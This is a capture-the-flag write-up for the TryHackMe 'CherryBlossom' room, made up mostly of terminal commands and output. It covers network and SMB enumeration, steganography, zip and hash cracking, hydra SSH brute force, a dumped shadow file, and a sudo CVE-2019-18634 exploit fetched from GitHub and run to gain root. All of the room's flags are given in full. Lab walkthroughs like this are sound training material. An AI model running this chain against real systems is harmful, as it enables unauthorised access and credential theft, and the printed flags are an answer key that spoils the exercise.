# CherryBlossom

Boot-to-root with emphasis on crypto and password cracking.

[CherryBlossom](https://tryhackme.com/room/cherryblossom)

## Topic's

- Network Enumeration
- Web Enumeration
- Rerverse Engineering
- Brute Forcing (Zip)
- Brute Forcing (Hash)
- Brute Forcing (SSH)
- Brute Forcing (Hash)
- CVE-2019-18634 - Sudo 1.8.25p - 'pwfeedback' Buffer Overflow

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Hack the machine and get the flags!

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ sudo nmap -A -sS -sC -sV -O 10.10.164.126
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 15:52 CEST
Nmap scan report for 10.10.164.126
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)
|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)
|_  256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=44693%PV=Y%DS=2%DC=T%G=Y%TM=5F8C48
OS:BC%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m38s, median: 1s
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: cherryblossom
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: cherryblossom
|_  System time: 2020-10-18T14:53:00+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-18T13:53:00
|_  start_date: N/A

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   36.91 ms 10.8.0.1
2   37.17 ms 10.10.164.126

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.66 seconds
```

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ sudo nmap --script smb-enum-shares -vv  10.10.164.126
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 15:54 CEST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 0.00s elapsed
Initiating Ping Scan at 15:54
Scanning 10.10.164.126 [4 ports]
Completed Ping Scan at 15:54, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:54
Completed Parallel DNS resolution of 1 host. at 15:54, 0.00s elapsed
Initiating SYN Stealth Scan at 15:54
Scanning 10.10.164.126 [1000 ports]
Discovered open port 22/tcp on 10.10.164.126
Discovered open port 139/tcp on 10.10.164.126
Discovered open port 445/tcp on 10.10.164.126
Completed SYN Stealth Scan at 15:54, 0.71s elapsed (1000 total ports)
NSE: Script scanning 10.10.164.126.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 5.80s elapsed
Nmap scan report for 10.10.164.126
Host is up, received echo-reply ttl 63 (0.041s latency).
Scanned at 2020-10-18 15:54:21 CEST for 7s
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Host script results:
| smb-enum-shares:
|   account_used: <blank>
|   \\10.10.164.126\Anonymous:
|     Type: STYPE_DISKTREE
|     Comment: Anonymous File Server Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba
|     Anonymous access: READ/WRITE
|   \\10.10.164.126\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 15:54
Completed NSE at 15:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.040KB)
```

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ cat journal.txt | base64 -d > output
kali@kali:~/CTFs/tryhackme/CherryBlossom$ file output
output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
kali@kali:~/CTFs/tryhackme/CherryBlossom$ stegpy output
File _journal.zip succesfully extracted from output
kali@kali:~/CTFs/tryhackme/CherryBlossom$ unzip _journal.zip
Archive:  _journal.zip
file #1:  bad zipfile offset (local header sig):  0
kali@kali:~/CTFs/tryhackme/CherryBlossom$ file _journal.zip
_journal.zip: JPEG image data
kali@kali:~/CTFs/tryhackme/CherryBlossom$ hexeditor _journal.zip
```

`50 4B 03 04`

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal2.zip


PASSWORD FOUND!!!!: pw == september
```

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ john --wordlist=/usr/share/wordlists/rockyou.txt Journal.hash
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 5 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigerlily        (Journal.ctz)
1g 0:00:06:17 DONE (2020-10-18 16:17) 0.002645g/s 14.81p/s 14.81c/s 14.81C/s brownsugar..inferno
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
Found this lying around an old computer my boss gave me to analyse. Couldn't figure it out.
Leaving it here. Hopefully all will become clear when I break the encryption:

THM{054a8f1db7618f8f6a41a0b3349baa11}
```

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ hydra -l lily -P cherry-blossom.list ssh://10.10.164.126
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-18 16:20:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task
[DATA] attacking ssh://10.10.164.126:22/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 9747 to do in 00:55h, 16 active
[STATUS] 131.33 tries/min, 394 tries in 00:03h, 9533 to do in 01:13h, 16 active
[22][ssh] host: 10.10.164.126   login: lily   password: Mr.$un$hin3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-18 16:26:38
```

`lily:Mr.$un$hin3`

```
lily@cherryblossom:/var/backups$ cat shadow.bak
root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
uuidd:*:17647:0:99999:7:::
avahi-autoipd:*:17647:0:99999:7:::
usbmux:*:17647:0:99999:7:::
dnsmasq:*:17647:0:99999:7:::
rtkit:*:17647:0:99999:7:::
speech-dispatcher:!:17647:0:99999:7:::
whoopsie:*:17647:0:99999:7:::
kernoops:*:17647:0:99999:7:::
saned:*:17647:0:99999:7:::
pulse:*:17647:0:99999:7:::
avahi:*:17647:0:99999:7:::
colord:*:17647:0:99999:7:::
hplip:*:17647:0:99999:7:::
geoclue:*:17647:0:99999:7:::
gnome-initial-setup:*:17647:0:99999:7:::
gdm:*:17647:0:99999:7:::
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
sshd:*:18301:0:99999:7:::
```

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ hashcat -m1800 -a0 --force johan.hash cherry-blossom.list
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
Dictionary cache hit:
* Filename..: cherry-blossom.list
* Passwords.: 9923
* Bytes.....: 99495
* Keyspace..: 9923

$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:##scuffleboo##

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYm...UX7ob0
Time.Started.....: Sun Oct 18 16:32:19 2020 (14 secs)
Time.Estimated...: Sun Oct 18 16:32:33 2020 (0 secs)
Guess.Base.......: File (cherry-blossom.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      497 H/s (5.09ms) @ Accel:128 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 6912/9923 (69.66%)
Rejected.........: 0/6912 (0.00%)
Restore.Point....: 6656/9923 (67.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: #sharry#1992 -> #music28

Started: Sun Oct 18 16:32:02 2020
Stopped: Sun Oct 18 16:32:34 2020
```

`##scuffleboo##`

```
lily@cherryblossom:/var/backups$ su - johan
Password:
johan@cherryblossom:~$ ls
user.txt
johan@cherryblossom:~$ cat user.txt
THM{cb064113d54e24dc84f26b1f63bf3098}
```

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
--2020-10-18 16:36:24--  https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6311 (6.2K) [text/plain]
Saving to: ‘exploit.c’

exploit.c               100%[==============================>]   6.16K  --.-KB/s    in 0s

2020-10-18 16:36:24 (15.2 MB/s) - ‘exploit.c’ saved [6311/6311]

kali@kali:~/CTFs/tryhackme/CherryBlossom$ gcc -o exploit exploit.c
kali@kali:~/CTFs/tryhackme/CherryBlossom$ scp exploit lily@10.10.164.126:/tmp
lily@10.10.164.126's password:
exploit                                                      100%   17KB 219.7KB/s   00:00
```

```
johan@cherryblossom:/tmp$ ls
exploit
systemd-private-2586c949a40742cd82cc17cef867130f-bolt.service-Akgi7x
systemd-private-2586c949a40742cd82cc17cef867130f-colord.service-vt9iYH
systemd-private-2586c949a40742cd82cc17cef867130f-rtkit-daemon.service-HNdlwE
systemd-private-2586c949a40742cd82cc17cef867130f-systemd-resolved.service-iZIGSg
systemd-private-2586c949a40742cd82cc17cef867130f-systemd-timesyncd.service-SS3wup
johan@cherryblossom:/tmp$ ./exploit
[sudo] password for johan:
Sorry, try again.
# whoami
root
# cat /root/root.txt
THM{d4b5e228a567288d12e301f2f0bf5be0}
```

1. Journal Flag

`THM{054a8f1db7618f8f6a41a0b3349baa11}`

2. User Flag

`THM{cb064113d54e24dc84f26b1f63bf3098}`

3. Root Flag

`THM{d4b5e228a567288d12e301f2f0bf5be0}`
